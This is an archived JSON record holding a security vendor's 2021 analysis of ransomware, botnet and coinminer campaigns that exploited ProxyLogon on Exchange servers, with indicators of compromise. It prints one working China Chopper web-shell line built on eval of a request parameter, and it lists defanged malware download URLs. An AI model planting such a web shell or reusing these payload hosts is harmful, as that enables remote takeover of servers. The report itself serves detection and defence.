{
    "id": "2b9d3d3f-d148-492d-81bf-c2b34a49f0e8",
    "created_at": "2023-01-12T15:01:54.787542Z",
    "updated_at": "2025-03-27T02:06:01.449692Z",
    "deleted_at": null,
    "sha1_hash": "8fcf75c70ceb4f44b429947a776c9da0a4377822",
    "title": "2021-05-06 - Proxylogon- A Coinminer, a Ransomware, and a Botnet Join the Party",
    "authors": "",
    "file_creation_date": "2022-05-27T23:01:11Z",
    "file_modification_date": "2022-05-27T23:01:11Z",
    "file_size": 618807,
    "plain_text": "# Proxylogon: A Coinminer, a Ransomware, and a Botnet Join the Party\n\n**[trendmicro.com/en_us/research/21/e/proxylogon-a-coinminer--a-ransomware--and-a-botnet-join-the-part.html](https://www.trendmicro.com/en_us/research/21/e/proxylogon-a-coinminer--a-ransomware--and-a-botnet-join-the-part.html)**\n\nMay 6, 2021\n\nFigure 1. The malware infection chains of BlackKingdom, Prometei, and LemonDuck\nLeveraging the ProxyLogon vulnerability allowed the threat actors behind BlackKingdom, Prometei, and LemonDuck to execute Chopper web\nshells (detected by Trend Micro as Backdoor.JS.CHOPPER.SMYCBCD and Trojan.ASP.CVE202126855.SM), which then led to the\ndeployment of the final payload in their respective infections. The China Chopper web shell, which was first discovered in 2012, continues to\nbe widely used by threat actors in their campaigns to gain remote access to a targeted system. It's recently been found in many ransomware\nfamilies, such as [Hello ransomware.](https://www.trendmicro.com/en_us/research/21/d/hello-ransomware-uses-updated-china-chopper-web-shell-sharepoint-vulnerability.html)\n\nOnce they have compromised a system, these can start deploying malicious activities, such as dropping ExchDefender.exe, a binary file seen\nin BlackKingdom and Prometei cases, or using a WMI modifier that leads to a LemonDuck infection.\n\n**BlackKingdom and Prometei infections**\n\nBoth BlackKingdom (detected by Trend Micro as Ransom.Win64.BLACKKINGDOM) and Prometei (detected as Backdoor.Win64.PROMETEI,\nTrojanSpy.Win32.PROMETEI, Coinminer.Win64.MALXMR, and Coinminer.Win64.TOOLXMR) infections make use of ExchDefender.exe,\nwhich copies itself to a Windows folder. It then creates MSExchangeDefenderPL, a service that contains its main routine and poses as security\nsoftware for Microsoft Exchange (Figure 2). This service will execute the binary file in the Windows folder with the command line “Dcomsvc”\n(Figure 3).\n\nFigure 2. Code snippet of the installation of MSExchangeDefenderPL\n\n\n-----\n\nFigure 3. Code snippet of the Dcomsvc command\n\nMSExchangeDefenderPL will then start enumerating files contained in this folder:\n\n_C:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth._\n\nIt searches this directory for files related to web shells used in other attacks and deletes them to make sure it’s the only remaining malware in\nthe system (Figure 4). These files are as follows:\n\nExpiredPassword.aspx\nfrowny.aspx\nlogoff.aspx\nlogon.aspx\nOutlookCN.aspx\nRedirSuiteServiceProxy.aspx\nsignout.aspx\nSvmFeedback.aspx\n\nFigure 4. Code snippet of the files to be deleted by\n\nMSExchangeDefenderPL\nAt this point, both BlackKingdom and Prometei will leverage the ProxyLogon vulnerability to deploy the Chopper web shell using a builder that\nmodifies the Offline Address Book (OAB). Once the OAB has undergone the malicious modifications and is launched, an .ASPX web shell is\ncreated via JavaScript on the system (Figure 5). It will then connect to the virtual path to initialize the malicious web shell (Figure 6).\n\nFigure 5. JavaScript code snippet that creates the\n\nweb shell\n\nFigure 6. Code snippet that executes the .ASPX web\n\nshell\n**LemonDuck infections**\n\nSimilarly, LemonDuck (detected by Trend Micro as Trojan.PS1.LEMONDUCK) capitalizes on the ProxyLogon bug to target systems, but its\ninfection utilizes Windows Management Instrumentation (WMI) to modify the OAB. In one such WMI entry, we have observed a PowerShell\nprocess that executes a Base64-encoded command (Figure 7). Deobfuscating the command revealed that it’s capable of modifying the\nExernalUrl parameter of a specific .ASPX file (Figure 8).\n\n\n-----\n\nFigure 7. The deobfuscated PowerShell\n\nFigure 8. The modified ExernalUrl parameter of an\n\n.ASPX file\nThis enables the remote execution of commands once the .ASPX file is loaded, a common technique used by China Chopper. The command\nthat executes the Chopper is as follows:\n\n_<script language=\"JScript\" runat=\"server\">function Page_Load(){/*Exchange Service*/eval(Request[\"unsafe\"],\"unsafe\");}</script>_\n\nChina Chopper is a web shell that’s capable of receiving and executing backdoor commands. In this case, it drops the payload for the\nLemonDuck malware.\n\n**Trend Micro solutions**\n\n[Trend Micro’s comprehensive XDR solution applies the most effective expert analytics to the deep data sets collected from Trend Micro](https://www.trendmicro.com/en_us/business/products/detection-response/xdr.html)\nsolutions across the enterprise — including email, endpoints, servers, cloud workloads, and networks — making faster connections to identify\nand stop attacks. Powerful artificial intelligence and expert security analytics correlate data from customer environments and Trend Micro’s\nglobal threat intelligence to deliver fewer, higher-fidelity alerts, leading to better, early detection. One console with one source of prioritized,\noptimized alerts supported with guided investigation simplifies the steps needed to fully understand the attack path and impact on the\norganization.\n\n**Indicators of compromise**\n\n**SHA256** **Filename** **Trend Micro Detection**\n\na99f8ef649a65ecaf2c1298f03598b4fb3f1b17939cbe58b0117d566059731b4 ExchDefender.exe Trojan.Win32.UNDEFENDEX.YEBDV\n\n16ae11e3ff6cd8daaa20dc3de03b05d49655278518d95c89750731539e606b0e ChackPassAS.aspx Trojan.ASP.CHOPPER.YPBDV\n\n806577311a873579a07445d0d7cdb7b2847dccdb306680563659d9fca7382708 YPEvQuXw.aspx Trojan.ASP.CVE202126855.SM\n\nd6ec34cdc7aa8c6199e3c017798b1c0fcb9c686a3e1d2c2d90683e1d63a6ae46 App_Web_kjvc3xzm.dll Backdoor.MSIL.CHOPPER.YABCP\n\nfcd3639277fa46bfcb7678d849bad50954caff4823b38b144a7e7b2ceb1e4b5d sqhost.exe Backdoor.Win64.PROMETEI.YEBDW\n\nf0a5b257f16c4ccff520365ebc143f09ccf233e642bf540b5b90a2bbdb43d5b4 zsvc.exe Backdoor.Win64.PROMETEI.YEBCS\n\ne4bd40643f64ac5e8d4093bddee0e26fcc74d2c15ba98b505098d13da22015f5 rdpcIip.exe TrojanSpy.Win32.PROMETEI.YEBDV\n\nd811b21ac8ab643c1a1a213e52c548e6cb0bea51ca426b75a1f5739faff16cbd m6.exe Coinminer.Win64.TOOLXMR.SMA\n\n6be5847c5b80be8858e1ff0ece401851886428b1f22444212250133d49b5ee30 WindowsUpdate.exe Trojan.Win32.COBALT.AX\n\n81a6de094b78f7d2c21eb91cd0b04f2bed53c980d8999bf889b9a268e9ee364c conhost.exe Coinminer_CryptoNight.SM-WIN64\n\nfb8f100e646dec8f19cb439d4020b5f5f43afdc2414279296e13469f13a018ca miwalk.exe HackTool.Win64.MIMIKATZ.ENS\n\nb9dbdf11da3630f464b8daace88e11c374a642e5082850e9f10a1b09d69ff04f jfkzhluonvbxicy.exe Ransom.Win64.BLACKKINGDOM.SM\n\n\n-----\n\nc3c786616d69c1268b6bb328e665ce1a5ecb79f6d2add819b14986f6d94031a1 mail.jsp Trojan.PS1.LEMONDUCK.YPBD2\n\n4ea66b41ac0e72976b42af9f0f7961f73c8eff3a1d9a3fd7e0dc7032bf4a488e a.jsp Trojan.PS1.LEMONDUCK.YXBCU\n\n2eb24fb51aad7e6d556eac8276f71321a32c866225a2883e7cd4a5f22f25669b if_mail.bin Trojan.PS1.LEMONDUCK.YXBCU\n\nb660aa7aca644ba880fdee75f0f98b2db3b9b55978cc47a26b3f42e7d0869fff m6.bin Trojan.PS1.LEMONDUCK.YXAH-A\n\nbc3835feff6f2b3b6a8da238b87b42dad05230d2fc40aefa1749477d6e232b78 m6g.bin Trojan.PS1.LEMONDUCK.YXBCT\n\n42012af7555dd2f3413161474bed658cf25b730a5354255e53cfa6cc2e0f646e kr.bin Trojan.PS1.LEMONDUCK.YXAJH\n\n317799c3e17b493625c600bac3e42d5f1f4c175915468400779679f0cf538bbc if.bin Worm.PS1.LEMONDUCK.YXBC-A\n\nhxxp://p1[.]feefreepool[.]net/cgi-bin/prometei[.]cgi?r=8&i=LAP057RQRL1WU541\nhxxp://173[.]249[.]19[.]202:1337/xmr64[.]exe\nhxxp://t[.]netcatkit[.]com/mail[.]jsp?mail\n\nExploits & Vulnerabilities\n\nOur telemetry showed three malware families taking advantage of the ProxyLogon vulnerability beginning in March: the coinminer LemonDuck\nwas sighted first, quickly followed by the ransomware BlackKingdom, then the Prometei botnet.\n\nBy: Arianne Dela Cruz, Cris Tomboc, Jayson Chong, Nikki Madayag, Sean Torre May 06, 2021 Read time: ( words)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-05-06 - Proxylogon- A Coinminer, a Ransomware, and a Botnet Join the Party.pdf"
    ],
    "report_names": [
        "2021-05-06 - Proxylogon- A Coinminer, a Ransomware, and a Botnet Join the Party.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535714,
    "ts_updated_at": 1743041161,
    "ts_creation_date": 1653692471,
    "ts_modification_date": 1653692471,
    "files": {
        "pdf": "https://archive.orkl.eu/8fcf75c70ceb4f44b429947a776c9da0a4377822.pdf",
        "text": "https://archive.orkl.eu/8fcf75c70ceb4f44b429947a776c9da0a4377822.txt",
        "img": "https://archive.orkl.eu/8fcf75c70ceb4f44b429947a776c9da0a4377822.jpg"
    }
}